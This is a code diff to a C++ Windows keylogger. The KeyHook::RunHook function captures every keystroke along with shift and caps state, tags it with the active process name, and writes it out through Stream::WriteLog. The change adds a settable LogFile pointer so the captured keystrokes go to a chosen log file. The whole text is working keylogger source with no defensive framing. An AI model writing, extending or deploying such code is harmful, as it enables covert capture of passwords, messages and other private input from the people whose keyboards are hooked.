@@ -6,6 +6,8 @@ std::string keyLog;
 bool caps = false;
 bool shift = false;
 
+Stream::LogFile *logFile;
+
 LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
   if (nCode < 0) {
 	CallNextHookEx(hook, nCode, wParam, lParam);
@@ -33,7 +35,7 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 	} else {
 	  keyLog += KeyConst::AddKey(key, caps, shift);
 	}
-	Stream::WriteLog(keyLog, clientInfo.activeProcess);
+	Stream::WriteLog(keyLog, clientInfo.activeProcess, *logFile);
 	keyLog.clear();
   }
 
@@ -62,7 +64,7 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 		keyName.insert(1, "/");
 	  }
 	  keyLog += keyName;
-	  Stream::WriteLog(keyLog, clientInfo.activeProcess);
+	  Stream::WriteLog(keyLog, clientInfo.activeProcess, *logFile);
 	  keyLog.clear();
 	}
   }
@@ -94,4 +96,7 @@ void KeyHook::HandleMessage(const bool logMsg) {
 	TranslateMessage(&msg);
 	DispatchMessage(&msg);
   }
+}
+void KeyHook::SetLogFile(Stream::LogFile *file) {
+	logFile = file;
 }
